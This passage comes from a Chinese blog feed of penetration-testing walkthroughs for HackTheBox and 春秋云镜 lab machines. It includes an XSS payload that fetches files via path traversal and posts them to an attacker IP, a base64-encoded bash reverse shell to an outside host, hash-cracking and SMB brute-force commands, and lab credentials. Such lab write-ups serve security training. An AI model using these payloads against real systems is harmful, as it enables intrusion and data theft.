class="line"><span class="string">&#x27;formula&#x27;</span>: structure.formula,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;lattice&#x27;</span>: lattice_data,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;density&#x27;</span>: density,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;sites&#x27;</span>: sites</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;structure.html&#x27;</span>, structures=structure_data)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete_structure/&lt;identifier&gt;&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_structure</span>(<span class="params">identifier</span>):</span><br><span class="line"></span><br><span class="line">structure = Structure.query.filter_by(identifier=identifier, user_id=current_user.<span class="built_in">id</span>).first_or_404()</span><br><span class="line"></span><br><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], structure.identifier + <span class="string">&#x27;_&#x27;</span> + structure.filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line"></span><br><span class="line">os.remove(filepath)</span><br><span class="line"></span><br><span class="line">db.session.delete(structure)</span><br><span class="line"></span><br><span class="line">db.session.commit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line"></span><br><span class="line">db.create_all()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">$</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在instance目录下发现了db数据库，是sqlite3的数据库那直接用他的语法查看即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqlite3 /home/app/instance/database.db</span><br><span class="line"></span><br><span class="line">.table</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> user;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734071455111-e39f43cc-baa8-4eb0-9e00-12607a3b8568.png" alt=""></p><p>可以看到有rosa的hash所以来爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hashcat -m <span class="number">0</span> -a <span class="number">0</span> chem.<span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt -o cra</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里 -m 表示为md5 hash -a 0 表示使用字典 -o 表示输出</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734071939360-a2b43614-7f46-4899-8948-66466614fe0c.png" alt=""></p><p>得到密码所以直接ssh登录</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072024102-8572ff98-ae72-465f-ab6a-776157b6da1d.png" alt=""></p><p>得到一个密码</p><h3 id="提权">提权</h3><p>检查sudo是否可以使用，列出所有可以用sudo执行的文件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072093284-05c51878-0579-4b32-8a64-9dad4421dede.png" alt=""></p><p>发现不能使用，那么看一下有没有启动的其他服务netstat看一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072196100-0de3ea05-7dd3-4ef1-a390-0110623efe85.png" alt=""></p><p>发现有一个服务，看一下权限</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072258588-d51263ff-f915-4e8f-9697-f4ec488d7de6.png" alt=""></p><p>能够看到是root启动的。那么我们还是转发一下在我们本地看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh rosa@<span class="number">10.10</span><span class="number">.11</span><span class="number">.38</span> -L <span class="number">8080</span>:localhost:<span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072451585-30c1d804-e17b-47d6-b07a-f64081437a51.png" alt=""></p><p>也并没有啥有用的信息看看响应头有没有什么东西</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072484245-c25b4cd8-d75f-46ac-9944-f5fea8f3c540.png" alt=""></p><p>可以看到服务器是aiohttp那么去找一下这个服务器有什么漏洞吗</p><p><a href="https://github.com/z3rObyte/CVE-2024-23334-PoC">https://github.com/z3rObyte/CVE-2024-23334-PoC</a>有一个目录遍历漏洞这里可以用脚本也可以直接手打</p><p>就直接手动获取root的flag吧</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734073064450-721537ec-0a5f-4c45-a2c8-035e9df047e2.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;端口扫描&quot;&gt;端口扫描&lt;/h2&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
    <category term="Linux" scheme="https://oceanzbz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Alert</title>
    <link href="https://oceanzbz.github.io/post/d63c69c5.html"/>
    <id>https://oceanzbz.github.io/post/d63c69c5.html</id>
    <published>2024-12-30T07:23:45.000Z</published>
    <updated>2025-03-05T07:24:36.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nmap扫描">nmap扫描</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -T4 -Pn <span class="number">10.10</span><span class="number">.11</span><span class="number">.44</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011531560-4ad35699-f24f-45de-8457-32e0d2673b19.png" alt=""></p><p>发现域名alert.htb将其加入到hosts文件里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011610979-27468c86-374a-4e14-9441-ff79155ee42e.png" alt=""></p><h2 id="子域名扫描">子域名扫描</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-<span class="number">20000.</span>txt -u http:<span class="comment">//alert.htb/ -H &quot;Host:FUZZ.alert.htb&quot; -fc 301</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734012003966-f4dc5256-4552-438b-b686-6dc07c8e4ab3.png" alt=""></p><p>扫描到一个子域名同样也加入到hosts里面。</p><h2 id="xss">xss</h2><p>下面打开主页面</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015219181-fa72cdbd-36f9-4575-8183-a8f036c407fe.png" alt=""></p><p>可以看到有一个上传md的页面我们可以联想到xss</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015248168-729e9cb2-ca50-4ac5-a395-769ea386affa.png" alt=""></p><p>可以看到已经触发了xss。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015296663-1ab21cd0-e12f-46ac-b7cb-cd5b1640f9f3.png" alt=""></p><p>同时在上传页面中有一个分享上传的链接的按钮猜测是可以发送</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015330910-ded2653b-909b-42d7-8f32-8b577473903f.png" alt=""></p><p>这里有一个发送页面抓包查看一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015356440-d8b2eb0e-4f23-41d0-8f14-a7b02c8381ca.png" alt=""></p><p>在这里改成我们自己监听的ip端口可以接收到请求</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015399661-8fd6adf7-afb1-436a-bdf0-073d6f19e23a.png" alt=""></p><p>所以可以推测我们发送的链接后台会点机该链接</p><h2 id="漏洞利用">漏洞利用</h2><p>思路：首先，上传带有恶意<code>js</code>代码的<code>md</code>文件，向管理员发送该<code>md</code>文件的链接，诱导管理员访问该<code>md</code>页面，当管理员访问了上传的<code>md</code>文件时，<code>md</code>夹带的恶意<code>js</code>代码工作，从管理员的客户端发起对<code>http://alert.htb</code>的请求，并将请求获得的响应内容发送至我们的攻击机。</p><p>不同与其他<code>xss</code>窃取<code>cookie</code>的思路，这里是为了看到一些只有管理员权限才能看见的㊙️🍯东西。</p><p>编写并上传恶意<code>md</code>文件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734018247182-761d6f1c-42ed-4744-9c16-511c6fd795bf.png" alt=""></p><p>这段代码的意思可以自行查看gpt的解释就是客户端会请求alert.htb这个域名然后将返回的text发送到我们监听的1234端口上</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734018705149-4afe640b-957d-42aa-b5f4-ab7ac8cc44e9.png" alt=""></p><p>可以看到多了一个messages参数</p><p>在深入利用一下只需要将index.php?page=messages加到url参数后面在发送一遍触发一遍xss就可以得到回显</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734022833362-579d728d-8292-4bf0-a0a0-f3d0f59d552b.png" alt=""></p><p>这里在重复上一步操作可以得到回显读取到内容</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734023123154-2a212eac-8797-4d6b-998a-313a34cb5f86.png" alt=""></p><p>所以这里我们是能够想到他是有文件包含读取功能的，这里我就不记录踩坑的过程了，读常规的/etc/passwd是读不到的，这里需要了解下htpasswd文件</p><p>参考这篇文章<a href="https://blog.csdn.net/cunjiu9486/article/details/109071899">https://blog.csdn.net/cunjiu9486/article/details/109071899</a></p><p><code>apache2</code>网页认证的密码一般存在<code>.htapasswd</code>中。所以接下来就是去构造读取这个文件获取账户密码了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#####asasdfasdf</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&quot;http://alert.htb/messages.php?file=../../../../../../etc/apache2/sites-available/000-default.conf&quot;</span>)</span><br><span class="line"></span><br><span class="line">.then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">.then(data =&gt; fetch(<span class="string">&quot;http://10.10.16.32:1234&quot;</span>, &#123;</span><br><span class="line"></span><br><span class="line">method: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line"></span><br><span class="line">body: data</span><br><span class="line"></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065054504-18183843-5f31-4463-87f0-355fc99e587a.png" alt=""></p><p>已经传上去解析到了。下面就是发送xss触发一下了 <img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065204080-5da90bb8-1436-4a84-8d65-8898b3ec9ec0.png" alt=""></p><p>触发成功，发现了htpasswd的存放路径/var/www/statistics.alert.htb/.htpasswd，所以继续重复上一个步骤继续重放</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065779352-79a0726f-874a-4118-93b5-a91ad9984c90.png" alt=""></p><p>读到了一个加密的密码</p><p>使用jhon爆破下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-<span class="type">long</span> alert.hash</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hashcat</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hashcat -m <span class="number">1600</span> -a <span class="number">0</span> passwd ~/Documents/rockyou.txt --username --show</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734066195390-204e6dbb-79d5-442a-9373-f571c6698cca.png" alt=""></p><p>还需要show一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john --show alert.hash</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734066330579-398f2598-c9e7-42d0-8024-bc968ae7dd5d.png" alt=""></p><p>然后ssh连接即可</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734068966585-494fa4f9-0229-48f3-9418-bf97f9009ee5.png" alt=""></p><h2 id="提权">提权</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069006557-e05e3fef-ce0d-4213-b8a8-1dd19c9362d1.png" alt=""></p><p>发现有一个8080端口开着，这样的话就将该端口转发一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -L <span class="number">8080</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> albert<span class="meta">@alert</span>.htb</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069898682-dbb24f6a-1545-4c6c-8b4e-a1d696cb9229.png" alt=""></p><p>去找一下这个website monitor文件夹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069775933-fd693f4f-434a-4471-8444-37614e783bc3.png" alt=""></p><p>在opt目录下有一个root权限的文件替换一下改成反弹shell的脚本就可以反弹回来了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069539804-cee036c2-79ee-424c-97af-c36b9cbc5c8f.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;nmap扫描&quot;&gt;nmap扫描&lt;/h2&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
    <category term="Linux" scheme="https://oceanzbz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ThermalPower-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/5bfae1ca.html"/>
    <id>https://oceanzbz.github.io/post/5bfae1ca.html</id>
    <published>2024-12-30T07:17:46.000Z</published>
    <updated>2025-03-08T09:31:11.099Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>目录扫描</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734610583467-430bbe2f-d9f7-4242-be54-8f958420b404.png" alt=""></p><p>扫出来一个headump，用内存工具分析一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734610609384-10488334-2f25-4aee-a4ff-3a348f5aa7db.png" alt=""></p><p>找到shiro key直接利用一波</p><h2 id="漏洞利用">漏洞利用</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734610631962-dbc2cbf0-0e32-437c-b1aa-dc78d25cb00c.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bash -c <span class="string">&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjMuMTIwLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后反弹shell拿到shell看下网卡信息</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734610659338-e86cef98-be5e-4748-803d-ebef09418c30.png" alt=""></p><h2 id="内网信息收集">内网信息收集</h2><p>然后下载fscan直接扫描一波</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./fscan -h <span class="number">172.22</span><span class="number">.17</span><span class="number">.213</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">___ _</span><br><span class="line"></span><br><span class="line">/ _ \ ___ ___ _ __ __ _ ___| | __</span><br><span class="line"></span><br><span class="line">/ /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__| &lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\____/ |___/\___|_| \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fscan version: 1.8.4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(icmp) Target 172.22.17.6 is alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(icmp) Target 172.22.17.213 is alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:135 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:80 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.213:22 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:21 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.213:8080 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:445 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:139 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] alive ports len is: 7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NetBios 172.22.17.6 WORKGROUP\WIN-ENGINEER</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NetInfo</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*]172.22.17.6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]WIN-ENGINEER</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]172.22.17.6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.17.213:8080 code:302 len:0 title:None 跳转url: http://172.22.17.213:8080/login;jsessionid=8C8C2698165BC498428345B7768228CA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.17.213:8080/login;jsessionid=8C8C2698165BC498428345B7768228CA code:200 len:2936 title:火创能源监控画面管理平台</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] ftp 172.22.17.6:21:anonymous</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]Modbus</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]PLC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]web.config</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]WinCC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]内部软件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]火创能源内部资料</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.17.6 code:200 len:661 title:172.22.17.6 - /</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] PocScan http://172.22.17.213:8080 poc-yaml-spring-actuator-heapdump-file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] PocScan http://172.22.17.213:8080 poc-yaml-springboot-env-unauth spring2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">已完成 6/7 [-] ssh 172.22.17.213:22 root root_123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">已完成 6/7 [-] ssh 172.22.17.213:22 root 000000 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">已完成 6/7 [-] ssh 172.22.17.213:22 root 2wsx@WSX ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">已完成 6/7 [-] ssh 172.22.17.213:22 admin Admin@123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">已完成 6/7 [-] ssh 172.22.17.213:22 admin 666666 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">已完成 6/7 [-] ssh 172.22.17.213:22 admin 1qaz!QAZ ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">已完成 7/7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 6m36.928867719s</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>这里有netbios开放想到可能会有rdp</p><h2 id="搭建代理">搭建代理</h2><p>搭建代理访问里面的信息，这里使用frp进行访问吧</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734611778092-5f757949-7c28-4c85-9f92-c766a3c84dee.png" alt=""></p><p>可以成功访问到内网的网页看一下这些敏感信息</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734611830045-44de8842-119b-4e7e-b095-17b76ca86324.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734617336939-3c74cc86-862b-48ba-836f-213a8d85c271.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734617357868-a9ea565a-c03c-4bda-991c-a9ce0feafb73.png" alt=""></p><p>使用chenhua chenhua@0813 可以登录成功爆破一下就可以了使用cme</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crackmapexec smb <span class="number">172.22</span><span class="number">.17</span><span class="number">.6</span> -u chenhua -p chenhua@0813</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kali rdp命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">proxychains -q xfreerdp /u:chenhua /p:chenhua@0813 /v:<span class="number">172.22</span><span class="number">.17</span><span class="number">.6</span>:<span class="number">3389</span> +clipboard /drive:tmp,/tmp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我这里用的是parallesclient</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734614943779-5fbb5fb8-0fc3-452b-b286-d110e814148f.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734615054752-2e3de705-4329-47f9-8bb3-84bf52884d6b.png" alt=""></p><p>可以看到用户都是属于backupOperators组里的并且这个机器不出网所以只能提权，参考：</p><p><a 